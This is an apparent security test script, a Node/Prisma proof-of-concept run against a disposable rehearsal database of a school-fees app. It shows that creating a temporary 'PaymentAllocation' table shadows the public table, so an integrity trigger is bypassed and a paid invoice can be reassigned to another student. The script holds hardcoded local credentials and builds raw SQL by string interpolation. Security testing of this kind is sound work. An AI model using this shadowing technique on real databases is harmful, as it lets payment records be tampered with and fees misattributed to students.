import { PrismaClient } from '@prisma/client';

const TARGET_DB_URL = 'postgresql://knowletive:knowletive@127.0.0.1:5432/knowletive_final_rehearsal_20261121_184300?schema=public';

const prisma = new PrismaClient({
  datasources: { db: { url: TARGET_DB_URL } }
});

async function main() {
  console.log('===================================================================');
  console.log('  TEST A: TEMPORARY TABLE SHADOWING PROOF-OF-CONCEPT');
  console.log('  Target Database: knowletive_final_rehearsal_20261121_184300');
  console.log('===================================================================\n');

  // Verify target database
  const [currDb] = await prisma.$queryRawUnsafe(`SELECT current_database() as name;`);
  console.log(`Connected to: ${currDb.name}`);
  if (currDb.name !== 'knowletive_final_rehearsal_20261121_184300') {
    throw new Error(`ABORT: Refusing to run on database ${currDb.name}!`);
  }

  // Fetch two existing students from the same tenant
  const students = await prisma.$queryRawUnsafe(`
    SELECT id, "tenantId", "branchId" 
    FROM public."Student" 
    WHERE "tenantId" IS NOT NULL 
    LIMIT 2;
  `);

  if (students.length < 2) {
    throw new Error('Need at least 2 students in database for test.');
  }

  const s1 = students[0];
  const s2 = students[1];
  const tenantId = s1.tenantId;
  const branchId = s1.branchId;
  console.log(`Using existing Tenant: ${tenantId}`);
  console.log(`Using Student 1: ${s1.id}`);
  console.log(`Using Student 2: ${s2.id}`);

  // Execute test inside a transaction that we roll back at the end
  await prisma.$executeRawUnsafe(`BEGIN;`);

  try {
    const testInvoiceId = 'test_inv_poc_' + Date.now();
    const testReceiptId = 'test_rcpt_poc_' + Date.now();
    const testAllocId = 'test_alloc_poc_' + Date.now();

    // 1. Create FeeInvoice for Student 1
    await prisma.$executeRawUnsafe(`
      INSERT INTO public."FeeInvoice" (id, "tenantId", "branchId", "studentId", "number", "title", "amount", "paidAmount", "currency", "status", "dueDate", "issuedAt", "createdAt", "updatedAt")
      VALUES ('${testInvoiceId}', '${tenantId}', ${branchId ? `'${branchId}'` : 'NULL'}, '${s1.id}', 'INV-POC-001', 'Test Invoice', 5000, 5000, 'INR', 'PAID', now(), now(), now(), now());
    `);

    // 2. Create PaymentReceipt for Student 1
    await prisma.$executeRawUnsafe(`
      INSERT INTO public."PaymentReceipt" (id, "tenantId", "branchId", "studentId", "receiptNumber", "amount", "method", "status", "paymentDate", "receivedAt", "updatedAt")
      VALUES ('${testReceiptId}', '${tenantId}', ${branchId ? `'${branchId}'` : 'NULL'}, '${s1.id}', 'RCP-POC-001', 5000, 'UPI', 'CONFIRMED', now(), now(), now());
    `);

    // 3. Create PaymentAllocation linking Receipt to Invoice
    await prisma.$executeRawUnsafe(`
      INSERT INTO public."PaymentAllocation" (id, "tenantId", "receiptId", "feeInvoiceId", "amount", "createdAt", "updatedAt")
      VALUES ('${testAllocId}', '${tenantId}', '${testReceiptId}', '${testInvoiceId}', 5000, now(), now());
    `);

    console.log('✓ Successfully created test FeeInvoice with active PaymentAllocation in public schema.');

    // Step 2: Attempt invoice reassignment WITHOUT temp table (Baseline test)
    console.log('\n--- Step 2: Attempting student reassignment WITHOUT temp table (Baseline) ---');
    let baselineBlocked = false;
    try {
      await prisma.$executeRawUnsafe(`
        UPDATE public."FeeInvoice"
        SET "studentId" = '${s2.id}'
        WHERE id = '${testInvoiceId}';
      `);
      console.log('❌ UNEXPECTED: Baseline update SUCCEEDED! Trigger did not block!');
    } catch (err) {
      baselineBlocked = true;
      console.log('✓ Expected Baseline Behavior: Trigger blocked the reassignment.');
      const errLine = err.message.split('\n').find(l => l.includes('Cannot reassign') || l.includes('ERROR:'));
      console.log(`  Trigger Exception: ${errLine || err.message}`);
    }

    if (!baselineBlocked) {
      throw new Error('Baseline failed: Trigger did not block reassignment when allocations exist.');
    }

    // Step 3: Create a TEMPORARY table "PaymentAllocation"
    console.log('\n--- Step 3: Creating TEMPORARY table "PaymentAllocation" in the session ---');
    await prisma.$executeRawUnsafe(`
      CREATE TEMP TABLE "PaymentAllocation" (
        id text,
        "feeInvoiceId" text,
        amount integer
      );
    `);
    console.log('✓ Temporary table "PaymentAllocation" created in pg_temp.');

    // Step 4: Attempt invoice reassignment WITH temp table present
    console.log('\n--- Step 4: Attempting student reassignment WITH temporary table present ---');
    let exploitSucceeded = false;
    try {
      await prisma.$executeRawUnsafe(`
        UPDATE public."FeeInvoice"
        SET "studentId" = '${s2.id}'
        WHERE id = '${testInvoiceId}';
      `);
      exploitSucceeded = true;
      console.log('🚨 VULNERABILITY CONFIRMED: Update SUCCEEDED!');
      console.log('   The trigger resolved pg_temp."PaymentAllocation" (empty) instead of public."PaymentAllocation"!');
    } catch (err) {
      console.log('Trigger blocked update despite temp table:', err.message);
    }

    // Verify database state if exploit succeeded
    if (exploitSucceeded) {
      const [updatedInv] = await prisma.$queryRawUnsafe(`
        SELECT id, "studentId" FROM public."FeeInvoice" WHERE id = '${testInvoiceId}';
      `);
      console.log(`\n  Invoice ${updatedInv.id} studentId was modified to: ${updatedInv.studentId}`);
      console.log(`  (Successfully reassigned from ${s1.id} to ${s2.id} despite active allocations in public!)`);
      
      const allocs = await prisma.$queryRawUnsafe(`
        SELECT id, "feeInvoiceId", "receiptId", amount FROM public."PaymentAllocation" WHERE "feeInvoiceId" = '${testInvoiceId}';
      `);
      console.log(`  Active allocations that were shadowed in public."PaymentAllocation":`);
      console.table(allocs);
    }

    return { baselineBlocked, exploitSucceeded };

  } finally {
    // Always rollback so the test leaves no permanent trace
    await prisma.$executeRawUnsafe(`ROLLBACK;`);
    console.log('\n✓ Transaction rolled back cleanly. Disposable DB state preserved.');
  }
}

main().catch(console.error).finally(() => prisma.$disconnect());
